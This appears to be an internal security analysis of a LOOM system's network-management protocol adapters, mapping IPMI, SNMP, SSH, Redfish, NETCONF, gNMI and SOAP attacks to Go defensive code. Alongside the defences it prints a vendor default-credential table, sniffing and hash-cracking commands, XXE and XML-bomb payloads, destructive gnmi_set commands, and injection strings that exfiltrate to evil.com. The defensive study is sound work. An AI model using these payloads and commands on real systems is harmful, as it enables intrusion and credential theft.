# LOOM Protocol Adapter Attack Surface Analysis

**Date:** 2026-03-21
**Scope:** All protocol adapters (IPMI, SNMP, SSH, Redfish, NETCONF, gNMI, WS-Management)
**Classification:** Internal -- Security Research
**PoC Code:** `/tmp/loom-security-adapters/`

---

## Executive Summary

LOOM's protocol adapters represent the most dangerous attack surface in the system. Each adapter speaks a protocol designed for trusted networks, yet LOOM must operate across environments where those trust assumptions may not hold. This analysis documents 10 attack categories across 7 protocols, with exploit concepts and defensive implementations in Go.

**Critical findings:**

| # | Attack | Severity | Protocol | Exploitability |
|---|--------|----------|----------|---------------|
| 1 | IPMI RAKP hash leak (CVE-2013-4786) | **CRITICAL** | IPMI | Trivial -- any network-adjacent attacker |
| 2 | IPMI cipher zero bypass | **CRITICAL** | IPMI | Trivial -- no credentials needed |
| 3 | SNMPv2c community string sniffing | **HIGH** | SNMP | Trivial -- passive network capture |
| 4 | SSH MITM via InsecureIgnoreHostKey | **HIGH** | SSH | Moderate -- requires ARP/DNS spoofing |
| 5 | Redfish token theft via TLS bypass | **HIGH** | Redfish | Moderate -- requires MITM position |
| 6 | Redfish token leakage in logs | **MEDIUM** | Redfish | Low -- requires log access |
| 7 | NETCONF XXE/XML bomb | **HIGH** | NETCONF | Moderate -- requires compromised device |
| 8 | gNMI plaintext exposure | **HIGH** | gNMI/gRPC | Trivial -- passive capture |
| 9 | gNMI unauthorized Set operations | **CRITICAL** | gNMI/gRPC | Trivial without mTLS |
| 10 | WS-Management XML bomb | **HIGH** | AMT/SOAP | Moderate -- requires MITM or compromised BMC |
| 11 | WS-Management XXE | **HIGH** | AMT/SOAP | Moderate -- same as above |
| 12 | SOAP header injection | **MEDIUM** | AMT/SOAP | Moderate -- requires MITM |
| 13 | Credential caching in memory | **HIGH** | All | Low -- requires process memory access |
| 14 | SNMP response injection | **MEDIUM** | SNMP | Moderate -- requires compromised device |
| 15 | Redfish JSON path traversal | **MEDIUM** | Redfish | Moderate -- requires compromised BMC |
| 16 | SSH terminal injection | **LOW** | SSH | Moderate -- requires compromised device |
| 17 | Adapter slowloris / goroutine exhaustion | **HIGH** | All | Moderate -- requires compromised devices |

---

## 1. IPMI Protocol Vulnerabilities

**PoC code:** `/tmp/loom-security-adapters/01_ipmi_vulns.go`

### 1a. RAKP Authentication Hash Leak (CVE-2013-4786)

**Severity:** CRITICAL
**CVE:** CVE-2013-4786
**CVSS:** 7.5 (High)

**Vulnerability:** IPMI 2.0's RAKP (Remote Authenticated Key Exchange Protocol) leaks a salted HMAC-SHA1 hash of the user's password to any network-adjacent attacker who knows a valid username. The attacker sends RMCP+ Open Session Request and RAKP Message 1 to UDP port 623. The BMC responds with RAKP Message 2 containing an HMAC keyed with the user's password. The attacker possesses all other HMAC inputs and can brute-force the password offline.

**Attack flow:**

```
Attacker                          BMC (UDP 623)
   │                                 │
   │─── Open Session Request ───────>│
   │<── Open Session Response ───────│  (session IDs)
   │                                 │
   │─── RAKP Message 1 ────────────>│  (username "ADMIN" + random nonce)
   │<── RAKP Message 2 ────────────│  (HMAC-SHA1 keyed with PASSWORD)
   │                                 │
   │  Attacker now has all HMAC      │
   │  inputs except the password.    │
   │  Offline cracking begins.       │
   │                                 │
   │  hashcat -m 7300 hash.txt      │
   │  rockyou.txt                    │
```

**Key insight:** This is a PROTOCOL-LEVEL flaw. It cannot be patched by BMC firmware. Every IPMI 2.0 implementation is vulnerable. The only mitigations are network isolation and strong passwords.

**HMAC computation (attacker reconstructs this):**

```go
// Attacker has ALL of these values from the handshake:
data := concat(
    bmcSessionID,           // from Open Session Response
    remoteConsoleSessionID, // attacker chose this
    remoteConsoleRandom,    // attacker chose this
    bmcRandom,              // from RAKP Message 2
    bmcGUID,                // from RAKP Message 2
    authLevel,              // attacker chose this
    usernameLength,         // attacker knows this
    username,               // attacker knows this
)

// The only unknown is the password (used as HMAC key):
hmac_sha1(key=PASSWORD, data=data) == hmacFromBMC  // brute force this
```

**Cracking speed:** Modern GPUs crack IPMI hashes at ~10 billion guesses/second (hashcat mode 7300). An 8-character password falls in under a minute.

### 1b. Cipher Suite Zero -- No Authentication

**Severity:** CRITICAL

Some BMCs accept IPMI sessions negotiated with cipher suite 0, which provides no authentication, no integrity, and no confidentiality. An attacker can issue any IPMI command without credentials.

```
Cipher Suite 0: Auth=none, Integrity=none, Confidentiality=none
```

With cipher suite 0, an attacker can:
- Power off every server in a rack
- Change boot devices to PXE (boot attacker's OS)
- Read all sensor data
- Modify BMC user accounts (add backdoor users)
- Change BMC network configuration

### 1c. Default Credentials

BMC vendors ship with well-known default credentials:

| Vendor | Username | Password | Notes |
|--------|----------|----------|-------|
| Generic | ADMIN | ADMIN | Extremely common |
| Dell iDRAC | root | calvin | Default since iDRAC6 |
| HP iLO | Administrator | password | HP Integrated Lights-Out |
| Supermicro | ADMIN | ADMIN | X9/X10/X11/X12 boards |
| Lenovo IMM | USERID | PASSW0RD | Zero, not letter O |
| IBM IMM | USERID | PASSW0RD | Same as Lenovo |
| Cisco CIMC | admin | password | UCS C-Series |
| Oracle ILOM | root | changeme | Oracle/Sun servers |
| Fujitsu iRMC | admin | admin | Fujitsu servers |

### LOOM Defense: IPMI Security Policy

```go
type IPMISecurityPolicy struct {
    BanCipherZero            bool          // MUST be true
    MinCipherSuite           int           // 3 minimum (AES), 17 ideal (SHA-256+AES)
    RequireManagementVLAN    bool          // IPMI only on isolated VLAN
    ManagementSubnets        []string      // allowed CIDR ranges
    AuditDefaultCredentials  bool          // check known defaults on connect
    MaxSessionDuration       time.Duration // force session rotation
    RequireCredentialRotation bool         // block devices with defaults
}
```

**Mandatory controls:**
1. **Ban cipher suite 0** -- validate negotiated cipher suite before any operation
2. **Management VLAN isolation** -- BMC addresses must be on dedicated subnets
3. **Credential audit** -- check against known defaults on first connection
4. **Reject default credentials** -- refuse to manage devices that haven't changed defaults
5. **Session timeout** -- close IPMI sessions after 5 minutes maximum
6. **Strong passwords** -- enforce minimum 16-character passwords for BMC accounts

---

## 2. SNMP Community String Exposure

**PoC code:** `/tmp/loom-security-adapters/02_snmp_exposure.go`

**Severity:** HIGH

### Vulnerability

SNMPv2c sends community strings in plaintext UDP. The community string (which functions as a password) is visible in every packet at a fixed offset in the BER/ASN.1 encoding:

```
Packet hex dump:
30 29                           SEQUENCE
   02 01 01                     INTEGER 1 (SNMPv2c)
   04 06 70 75 62 6c 69 63     OCTET STRING "public"  <-- PLAINTEXT
   a0 1c                        GetRequest-PDU
```

**Exploitation:**
```bash
# Capture community strings from management network:
tcpdump -i eth0 -nn udp port 161 -A 2>/dev/null | grep -oP '[\x20-\x7e]{4,32}'

# Or with tshark for structured output:
tshark -i eth0 -f "udp port 161" -T fields -e snmp.community
```

Any device on the management VLAN -- including compromised servers, rogue devices, or an attacker who has gained access to the management network -- can passively capture every SNMP community string.

**Impact:** Most networks use the same community string across all devices. Capturing one packet reveals credentials for the entire infrastructure.

### LOOM Defense: SNMPv3 Enforcement

```go
type SNMPSecurityPolicy struct {
    RequireSNMPv3                bool   // block SNMPv2c entirely
    AllowSNMPv2cOnManagementVLAN bool   // pragmatic fallback for legacy
    MinSecurityLevel             SNMPSecurityLevel // must be AuthPriv
    BannedAuthProtocols          []string // ["MD5"]
    BannedPrivProtocols          []string // ["DES"]
}
```

**Mandatory controls:**
1. **Enforce SNMPv3 with authPriv** -- authentication (SHA/SHA-256) and encryption (AES)
2. **Ban MD5 and DES** -- both are cryptographically broken
3. **If SNMPv2c is unavoidable** -- restrict to management VLAN only, document as "legacy insecure"
4. **Per-device community strings** -- never reuse across devices
5. **Classify SNMPv2c devices** -- track and plan migration path to v3

---

## 3. SSH Man-in-the-Middle

**PoC code:** `/tmp/loom-security-adapters/03_ssh_mitm.go`

**Severity:** HIGH

### Vulnerability

Go's `ssh.InsecureIgnoreHostKey()` callback accepts any host key without verification. This is equivalent to disabling TLS certificate validation -- it makes SSH MITM attacks trivial.

**Vulnerable pattern (NEVER use this):**
```go
config := &ssh.ClientConfig{
    HostKeyCallback: ssh.InsecureIgnoreHostKey(), // VULNERABLE
}
```

**Attack scenario:**
1. Attacker ARP-spoofs the management VLAN (or poisons DNS)
2. LOOM connects to "switch.mgmt.local" which now resolves to attacker's IP
3. Attacker runs an SSH proxy server
4. LOOM connects, sees the attacker's host key, but `InsecureIgnoreHostKey` accepts it
5. Attacker forwards the connection to the real switch
6. Attacker captures all commands, responses, and the authentication credentials

### LOOM Defense: Host Key Pinning with TOFU

LOOM implements a host key database with three TOFU modes:

| Mode | Behavior | Use Case |
|------|----------|----------|
| `TOFUReject` | Block unknown keys entirely | High-security environments |
| `TOFUAcceptAndFlag` | Accept first key, flag for review | Standard deployment |
| `TOFURequireApproval` | Accept but block operations until approved | Moderate security |

**Key change detection:**
```
SECURITY: SSH HOST KEY CHANGED for device switch01 (10.0.100.50).
  Expected: SHA256:xYz123... (ssh-ed25519)
  Got:      SHA256:aBc456... (ssh-ed25519)
  This could indicate a MITM attack or legitimate key rotation.
```

**Additional hardening:**
- Restrict to modern key exchange: `curve25519-sha256`, `ecdh-sha2-nistp256`
- Restrict ciphers: `chacha20-poly1305`, `aes256-gcm`
- Ban `ssh-rsa` (SHA-1 based) and `ssh-dss` (DSA, broken)
- Ban weak MACs: require `hmac-sha2-256-etm` minimum

---

## 4. Redfish Session Token Theft

**PoC code:** `/tmp/loom-security-adapters/04_redfish_token.go`

**Severity:** HIGH (TLS bypass), MEDIUM (log leakage)

### 4a. TLS Misconfiguration

BMCs commonly use self-signed certificates. The temptation is to disable TLS verification:

```go
// VULNERABLE -- accepts any certificate, including attacker's
TLSClientConfig: &tls.Config{
    InsecureSkipVerify: true,
}
```

This allows an attacker with MITM position to:
1. Present their own TLS certificate (accepted by LOOM)
2. Intercept the session creation POST (capture username/password)
3. Steal the `X-Auth-Token` from the response
4. Use the token to issue Redfish commands as LOOM

### 4b. Token Leakage in Logs

Redfish session tokens appear in HTTP headers. If LOOM logs headers for debugging:

```
level=DEBUG msg="Redfish API response"
  headers="map[X-Auth-Token:[abc123-ACTUAL-TOKEN-HERE]]"
```

Anyone with log access can extract valid session tokens.

### LOOM Defense

**TLS:**
- Build proper CA certificate pool (system CAs + enterprise CA bundle)
- Never set `InsecureSkipVerify: true`
- Support certificate pinning for BMCs with self-signed certs (similar to SSH TOFU)
- Minimum TLS 1.2, prefer TLS 1.3

**Logging:**
```go
var sensitiveHeaders = map[string]bool{
    "x-auth-token":  true,
    "authorization": true,
    "cookie":        true,
    "set-cookie":    true,
}

func SanitizeHeaders(headers http.Header) http.Header {
    sanitized := make(http.Header)
    for key, values := range headers {
        if sensitiveHeaders[strings.ToLower(key)] {
            sanitized[key] = []string{"[REDACTED]"}
        } else {
            sanitized[key] = values
        }
    }
    return sanitized
}
```

**JSON body sanitization** for patterns like `"Password":"..."` and `"Token":"..."`.

---

## 5. NETCONF XML Attacks

**PoC code:** `/tmp/loom-security-adapters/05_netconf_xxe.go`

**Severity:** HIGH

### 5a. XXE (XML External Entity)

A compromised network device sends a NETCONF `<rpc-reply>` containing an XXE payload:

```xml
<!DOCTYPE rpc-reply [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rpc-reply>
  <data><hostname>&xxe;</hostname></data>
</rpc-reply>
```

If LOOM's XML parser processes the DTD, the contents of `/etc/passwd` (or any file readable by the LOOM process) are injected into the parsed data.

**SSRF variant:** `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` exfiltrates cloud metadata.

### 5b. Billion Laughs (XML Bomb)

Recursive entity expansion turns ~1KB of XML into ~3GB in memory:

```xml
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
```

Each level multiplies by 10. Nine levels = 10^9 expansions.

### LOOM Defense

**Go advantage:** Go's `encoding/xml` does NOT process DTDs or external entities by default. This is a significant built-in defense.

**Defense-in-depth measures:**
1. **Reject DTD declarations** -- scan for `<!DOCTYPE` before parsing
2. **Size limits** -- 10 MB maximum response size
3. **Strict XML decoder** -- `decoder.Strict = true`
4. **Entity whitelist** -- only standard entities (lt, gt, amp, apos, quot)
5. **Two-stage parsing** -- validate envelope structure, then parse payload

```go
func SafeParseNETCONFResponse(data []byte) (*NETCONFRPCReply, error) {
    if len(data) > MaxXMLResponseSize { return nil, errTooLarge }
    if containsDTD(data) { return nil, errDTDDetected }
    decoder := xml.NewDecoder(bytes.NewReader(data))
    decoder.Strict = true
    // Parse with safe settings...
}
```

---

## 6. gNMI/gRPC Without TLS

**PoC code:** `/tmp/loom-security-adapters/06_gnmi_plaintext.go`

**Severity:** HIGH (plaintext), CRITICAL (unauthorized Set)

### 6a. Plaintext Protobuf Exposure

gNMI without TLS sends all data as plaintext protobuf. Unlike HTTP, protobuf is binary but NOT encrypted. With public `.proto` definitions (OpenConfig models), any sniffer can decode it:

```bash
tshark -i eth0 -f "tcp port 9339" -d "tcp.port==9339,grpc"
```

Exposed data includes: ACL rules, routing tables, VLAN configurations, interface configurations, and any credentials configured via gNMI Set.

### 6b. Unauthorized Set Operations

Without mTLS, any client that reaches the gNMI port can reconfigure devices:

```bash
# Delete all ACLs:
gnmi_set --target switch:9339 --delete /acl/acl-sets

# Add rogue static route:
gnmi_set --target router:9339 --update /network-instances/.../next-hop:10.99.99.1

# Enable port mirroring for exfiltration:
gnmi_set --target switch:9339 --update /mirror-sessions/session[name=exfil]/...
```

### LOOM Defense

```go
type GNMISecurityPolicy struct {
    RequireTLS    bool   // MUST be true -- no exceptions
    RequireMTLS   bool   // mutual TLS for client authentication
    CACertPath    string
    ClientCertPath string
    ClientKeyPath  string
    MinTLSVersion uint16
}
```

**Mandatory controls:**
1. **TLS is mandatory** -- never use `insecure.NewCredentials()`
2. **mTLS preferred** -- LOOM presents client certificate to device
3. **Message size limits** -- `MaxCallRecvMsgSize(16 MB)` to prevent memory exhaustion
4. **Pre-flight authorization** -- validate gNMI Set paths against critical path list before sending
5. **Certificate management** -- automated rotation, centralized CA

---

## 7. WS-Management/SOAP XML Attacks

**PoC code:** `/tmp/loom-security-adapters/07_wsmanagement_xml.go`

**Severity:** HIGH

Intel AMT uses SOAP/XML over HTTP(S). Three attack vectors:

### 7a. XML Bomb in SOAP Envelope

Same billion laughs attack, wrapped in a SOAP `<s:Envelope>`:
```xml
<!DOCTYPE s:Envelope [
  <!ENTITY a "aaaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  ...9 levels...
]>
```

### 7b. XXE via SOAP DTD

File read or SSRF via entity injection in SOAP response.

### 7c. SOAP Header Injection

A compromised AMT device (or MITM) injects extra SOAP headers:
- `<a:ReplyTo>` redirecting future requests to attacker
- `<w:SelectorSet>` confusing resource targeting
- Fake `<a:Action>` to trigger unintended operations

### LOOM Defense: SafeSOAPParser

```go
type SafeSOAPParser struct {
    maxSize           int          // 5 MB limit
    maxDepth          int          // 50 levels max nesting
    maxHeaders        int          // 20 headers max
    allowedNamespaces map[string]bool // whitelist of WS-* namespaces
}
```

**Defense layers:**
1. **Reject all DTD declarations** -- no DOCTYPE allowed in WS-Management
2. **Size limits** -- 5 MB maximum SOAP response
3. **Depth limits** -- 50 levels maximum XML nesting
4. **Header count limits** -- maximum 20 SOAP headers
5. **Namespace whitelist** -- reject unknown XML namespaces in headers
6. **UTF-8 validation** -- reject invalid encoding
7. **CDATA inspection** -- flag suspicious content in CDATA sections

---

## 8. Credential Caching in Adapter Memory

**PoC code:** `/tmp/loom-security-adapters/08_credential_caching.go`

**Severity:** HIGH

### Vulnerability

If adapters cache device credentials in connection pools, a memory dump exposes every managed device's password:

```bash
# Trigger core dump:
gcore <loom-adapter-pid>

# Search for credentials:
strings core.<pid> | grep -E '(password|ADMIN|calvin|root|BEGIN.*KEY)'
```

**Attack vectors for memory access:**
- Core dump after crash (default on many Linux distros)
- `/proc/<pid>/mem` (same-user or root)
- Swap file analysis
- Container escape to host `/proc`
- Cold boot attack (physical access)

### LOOM Defense: Just-in-Time Credentials with Memory Zeroing

**Architecture:**

```
                 ┌──────────┐
                 │  Vault   │ ◄── Credentials at rest (encrypted)
                 └────┬─────┘
                      │ Retrieve JIT
                      ▼
              ┌───────────────┐
              │ Authenticate  │ ◄── Credential in memory (~100ms)
              └───────┬───────┘
                      │ Zero credential, keep session token
                      ▼
              ┌───────────────┐
              │  Connection   │ ◄── Only session token stored
              │     Pool      │     No raw credentials
              └───────────────┘
```

**Key implementation details:**
```go
type SecureCredential struct {
    data   []byte
    zeroed bool
}

func (c *SecureCredential) Release() {
    // Overwrite memory with zeros
    for i := range c.data {
        c.data[i] = 0
    }
    runtime.KeepAlive(c.data) // prevent optimizer from removing zeroing
    c.zeroed = true
}
```

**Controls:**
1. **Credentials retrieved from vault just-in-time** -- only during authentication
2. **Zeroed immediately after use** -- `ZeroMemory()` with compiler fence
3. **Connection pools store session tokens** -- never raw passwords
4. **Re-authentication fetches fresh credentials** -- no credential caching
5. **String zeroing via unsafe** -- necessary because Go strings are immutable

---

## 9. Device Response Injection

**PoC code:** `/tmp/loom-security-adapters/09_response_injection.go`

**Severity:** MEDIUM

A compromised device sends crafted responses to exploit LOOM's parsers.

### 9a. SNMP Response Injection

Malicious values in SNMP responses:

| OID | Malicious Value | Attack |
|-----|-----------------|--------|
| sysDescr | `Cisco IOS'; DROP TABLE devices;--` | SQL injection |
| sysContact | `<script>fetch('http://evil.com/'+document.cookie)</script>` | XSS |
| sysLocation | `$(curl http://evil.com/exfil)` | Command injection |
| sysName | `switch01\n[CRITICAL] LOOM breached` | Log injection |

### 9b. Redfish JSON Path Traversal

Malicious `@odata.id` URIs:
```json
{"@odata.id": "/redfish/v1/Managers/../../../../../../etc/shadow"}
{"@odata.id": "http://evil.com/capture-credentials"}
```

Malicious action targets:
```json
{"target": "http://evil.com/steal"}
```

### 9c. SSH Terminal Injection

ANSI escape sequences in command output:
- `\x1b[2J\x1b[H` -- clear screen, show fake output
- `\x1b]0;...\x07` -- change terminal title
- `\x00` -- null byte to truncate strings

### LOOM Defense

**SNMP value sanitization:**
- Maximum value length (64 KB)
- Strip control characters (except tab/newline)
- Remove null bytes
- Alert on SQL/HTML injection patterns

**Redfish URI validation:**
- Reject absolute URLs with external hosts
- Detect and reject path traversal (`..`)
- Require `/redfish/` prefix
- Reject suspicious query parameters (callback, redirect)

**SSH output sanitization:**
- Strip all ANSI escape sequences via regex
- Remove null bytes
- Remove non-printable control characters
- Alert if sanitization changed the output

---

## 10. Adapter Timeout / Slowloris

**PoC code:** `/tmp/loom-security-adapters/10_adapter_timeout.go`

**Severity:** HIGH

### Vulnerability

A malicious device holds connections open indefinitely, exhausting LOOM's goroutine pool:

```
t=0s:    100 goroutines spawned for device operations
t=30s:   90 complete, 10 malicious devices hold connections
t=120s:  New operations start queueing
t=300s:  Connection pool exhausted -- ALL devices unreachable
t=600s:  10,000+ goroutines (retry storms)
t=900s:  OOM killed by kernel
```

The attacker only needs to compromise 5-10% of managed devices to take down the entire adapter fleet.

### LOOM Defense: Timeouts + Pool Limits + Circuit Breaker

**1. Protocol-specific timeouts (every operation MUST have a timeout):**

| Protocol | Connect | Read | Write | Idle | Total Operation |
|----------|---------|------|-------|------|-----------------|
| SSH | 10s | 30s | 10s | 5m | 2m |
| SNMP | 5s | 10s | 5s | 30s | 30s |
| Redfish | 10s | 30s | 10s | 2m | 2m |
| IPMI | 5s | 10s | 5s | 30s | 30s |
| NETCONF | 10s | 60s | 10s | 5m | 5m |
| gNMI | 10s | 30s | 10s | 10m | 5m |
| AMT | 10s | 30s | 10s | 2m | 2m |

**2. Connection pool limits:**
- Max 500 total connections across all devices
- Max 3 connections per device
- Max 10 pending operations per device
- Connection TTL: 15 minutes

**3. Circuit breaker per device:**

```
          ┌─────────┐  5 failures    ┌─────────┐
          │ CLOSED  │───────────────>│  OPEN   │
          │(normal) │                │(blocked)│
          └─────────┘                └────┬────┘
               ▲                          │
               │ 2/3 probes succeed       │ 30s timeout
               │                          ▼
          ┌────┴──────┐              ┌─────────┐
          │           │<─────────────│HALF-OPEN│
          └───────────┘              │(testing)│
                                     └─────────┘
```

- **3 consecutive timeouts** opens the circuit (timeouts are more suspicious than errors)
- **5 consecutive failures** opens the circuit
- **30-second** wait before half-open probes
- **2 of 3 probes** must succeed to close the circuit

**Timeout wrapper for all operations:**
```go
func ExecuteWithTimeout(ctx, deviceID, opName, timeout, circuitBreaker, fn) {
    if err := cb.Allow(); err != nil { return err }  // circuit breaker check
    timeoutCtx := context.WithTimeout(ctx, timeout)   // strict timeout
    select {
    case result := <-fn(timeoutCtx):                   // operation completes
        cb.RecordSuccess()
    case <-timeoutCtx.Done():                          // timeout fires
        cb.RecordFailure(isTimeout: true)              // feeds circuit breaker
    }
}
```

---

## Cross-Cutting Security Recommendations

### 1. Management Network Isolation

Every protocol in this analysis is designed for trusted networks. LOOM must enforce:

- **Dedicated management VLAN** -- IPMI, SNMP, Redfish, AMT endpoints must be on isolated VLANs
- **Firewall rules** -- only LOOM adapter IPs can reach management ports
- **No production traffic** -- management VLAN carries zero production workload
- **Subnet validation** -- reject any device address outside approved management CIDRs

### 2. Credential Lifecycle

- **Vault-based storage** -- never plaintext at rest
- **Just-in-time retrieval** -- fetch from vault at connect time, zero after use
- **Session tokens over passwords** -- connection pools hold tokens, not credentials
- **Default credential detection** -- audit on first connection, block until changed
- **Automated rotation** -- rotate device credentials on a schedule

### 3. TLS Everywhere

| Protocol | TLS Requirement | Notes |
|----------|----------------|-------|
| Redfish | Required (HTTPS) | Enterprise CA support, cert pinning |
| gNMI | Required + mTLS preferred | Device presents cert, LOOM presents cert |
| NETCONF | Over SSH (implicit) | SSH provides the encrypted transport |
| SSH | Inherent | Host key verification required |
| WS-Management | Required (HTTPS) | AMT supports TLS |
| SNMP | N/A (SNMPv3 has own crypto) | Use authPriv with AES |
| IPMI | N/A (can't add TLS) | Management VLAN isolation only defense |

### 4. Input Validation on All Device Responses

LOOM must treat device responses as UNTRUSTED INPUT:

- **XML:** Reject DTDs, limit size, limit depth, validate namespaces
- **JSON:** Validate URIs, sanitize string values, reject external hosts
- **SNMP:** Length limits, strip control characters, alert on injection patterns
- **SSH:** Strip ANSI escapes, remove null bytes, alert on sanitization changes
- **Protobuf:** Message size limits, field validation

### 5. Resilience Against Compromised Devices

- **Circuit breakers** per device -- prevent one bad device from taking down the fleet
- **Strict timeouts** on every operation -- no indefinite waits
- **Connection pool limits** per device -- prevent resource exhaustion
- **Rate limiting** per device -- prevent burst attacks
- **Anomaly detection** -- alert when device behavior changes (new host keys, unusual response sizes, timeout patterns)

---

## File Index

| File | Attack | Protocol |
|------|--------|----------|
| `/tmp/loom-security-adapters/01_ipmi_vulns.go` | RAKP hash leak, cipher zero, default creds | IPMI |
| `/tmp/loom-security-adapters/02_snmp_exposure.go` | Community string sniffing | SNMP |
| `/tmp/loom-security-adapters/03_ssh_mitm.go` | MITM via InsecureIgnoreHostKey | SSH |
| `/tmp/loom-security-adapters/04_redfish_token.go` | Session token theft and log leakage | Redfish |
| `/tmp/loom-security-adapters/05_netconf_xxe.go` | XXE, billion laughs, XML injection | NETCONF |
| `/tmp/loom-security-adapters/06_gnmi_plaintext.go` | Plaintext exposure, unauthorized Set | gNMI/gRPC |
| `/tmp/loom-security-adapters/07_wsmanagement_xml.go` | XML bomb, XXE, SOAP header injection | WS-Management |
| `/tmp/loom-security-adapters/08_credential_caching.go` | Memory dump credential exposure | All |
| `/tmp/loom-security-adapters/09_response_injection.go` | SNMP/Redfish/SSH response injection | Multiple |
| `/tmp/loom-security-adapters/10_adapter_timeout.go` | Slowloris, goroutine exhaustion | All |
